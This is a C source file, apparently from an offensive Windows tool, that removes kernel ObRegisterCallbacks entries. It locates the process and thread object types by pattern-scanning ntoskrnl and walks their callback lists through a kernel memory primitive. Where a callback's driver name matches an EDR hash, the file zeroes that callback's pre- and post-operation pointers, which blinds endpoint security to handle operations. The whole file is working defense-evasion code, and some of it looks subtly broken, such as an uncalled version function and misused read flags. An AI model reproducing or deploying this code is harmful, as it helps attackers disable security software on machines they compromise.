#include "Common.h"
#include "Structs.h"

#include "RemoveCallBacks.h"

#include "stdio.h"

#define OB_CALLBACK_PRE_OPERATION_OFFSET    0x28  // 40
#define OB_CALLBACK_POST_OPERATION_OFFSET   0x30  // 48




static inline SIZE_T GetObCallbackListOffset(DWORD major, DWORD minor) {
	if (major >= 10) return 0xC8;                    // Windows 10 and above
	if (major == 6 && minor == 3) return 0xC8;       // Windows 8.1
	if (major == 6) return 0xC0;                     // Windows 7/8
	return 0;                                        // Unsupported version
}

void ProcessCallback(INT64 Flink, INT64 operationAddr, SIZE_T offset,
	PS_OBJECT_TYPE objectType, const CHAR* opType, BYTE* data) {
	CHAR* driverName = GetDriverName(operationAddr);
	if (driverName != NULL) {
		if (IsEDRHash(driverName)) {
			DriverMemoryOperation(data, (VOID*)(Flink + offset), 8, MEMORY_WRITE);
			PRINT("%s %s: %s [Clear]\n",
				objectType == PsProcessType ? "Process" : "Thread",
				opType,
				driverName);
		}
		else {
			PRINT("%s %s: %s\n",
				objectType == PsProcessType ? "Process" : "Thread",
				opType,
				driverName);
		}
	}
}

INT64 GetPsProcessAndProcessTypeAddr(PS_OBJECT_TYPE objectType) {
	INT64 FuncAddress = 0;
	UINT64 patternAddr = 0;
	UINT64 offset = 0;
	// Select target function based on objecttype
	switch (objectType) {
	case PsProcessType:
		FuncAddress = GetFuncAddressH(NTOSKRNLEXE_CH, NtDuplicateObject_CH);
		break;

	case PsThreadType:
		FuncAddress = GetFuncAddressH(NTOSKRNLEXE_CH, NtOpenThreadTokenEx_CH);
		break;

	default:
		PRINT("Invalid object type\n");
		return 0;
	}


	patternAddr = FindPattern(FuncAddress, &PREDEFINED_PATTERNS[4], 300);

	offset = CalculateOffset(patternAddr, 2, 6);

	// Calculate target VA
	INT64 PsProcessTypePtr = patternAddr + 7 + offset;

	// Read target address
	INT64 PsProcessTypeAddr = 0;
	DriverMemoryOperation((VOID*)PsProcessTypePtr, &PsProcessTypeAddr, 8, MEMORY_WRITE);
	return PsProcessTypeAddr;
}



VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, PS_OBJECT_TYPE objectType) {
	
	BYTE* data = (BYTE*)calloc(8, 1);
	if (data == NULL) return;
	
	DWORD dwMajor = GetNtVersion();
	DWORD dwMinorVersion = GetNtMinorVersion;
	INT64 CallbackListAddr = 0;
	INT64 offset = 0;

	// Get callback list offset based on OS version

	offset = GetObCallbackListOffset(dwMajor, dwMinorVersion);

	if (!PsProcessType || !offset) {
		PRINT("Unsupported OS version\n");
		return;
	}

	CallbackListAddr = PsProcessTypeAddr + offset;

	// Read list head pointers
	INT64 Flink = 0;
	DriverMemoryOperation((VOID*)CallbackListAddr, &Flink, 8, MEMORY_WRITE);
	INT64 Blink = 0;
	DriverMemoryOperation((VOID*)(CallbackListAddr + 8), &Blink, 8, MEMORY_WRITE);

	// Count callback nodes
	INT Count = 1;
	INT64 tFlink = Flink;
	do {
		Count++;
		INT64 temp = 0;
		DriverMemoryOperation((VOID*)(tFlink), &temp, 8, MEMORY_WRITE);
		tFlink = temp;
	} while (tFlink != Blink);

	// Process callback nodes
	

	for (INT i = 0; i < Count; i++) {
		// Read callback functions
		INT64 EDRPreOperation = 0;
		INT64 EDRPostOperation = 0;

		DriverMemoryOperation((VOID*)(Flink + OB_CALLBACK_PRE_OPERATION_OFFSET), &EDRPreOperation, 8, MEMORY_WRITE);
		DriverMemoryOperation((VOID*)(Flink + OB_CALLBACK_POST_OPERATION_OFFSET), &EDRPostOperation, 8, MEMORY_WRITE);


		ProcessCallback(Flink, EDRPreOperation, OB_CALLBACK_PRE_OPERATION_OFFSET,
						objectType, "PreOperation", data);
		ProcessCallback(Flink, EDRPostOperation, OB_CALLBACK_POST_OPERATION_OFFSET,
						objectType, "PostOperation", data);

		// Move to next node
		INT64 temp = 0;
		DriverMemoryOperation((VOID*)(Flink), &temp, 8, MEMORY_WRITE);
		Flink = temp;
	}

	free(data);
}

VOID ClearObRegisterCallbacks() {
	const struct {
		PS_OBJECT_TYPE type;
		const CHAR* name;
	} objects[] = {
		{ PsProcessType, "process" },
		{ PsThreadType, "thread" }
	};

	PRINT("\n----------------------------------------------------\n");
	PRINT("Register driver for ObRegisterCallbacks callback:\n");
	PRINT("----------------------------------------------------\n\n");

	// Process each object type
	for (int i = 0; i < sizeof(objects) / sizeof(objects[0]); i++) {
		INT64 typeAddr = GetPsProcessAndProcessTypeAddr(objects[i].type);

		if (typeAddr) {
			RemoveObRegisterCallbacks(typeAddr, objects[i].type);
		}
		else {
			PRINT("Failed to obtain %s type address.\n", objects[i].name);
		}
	}

	PRINT("\n");
}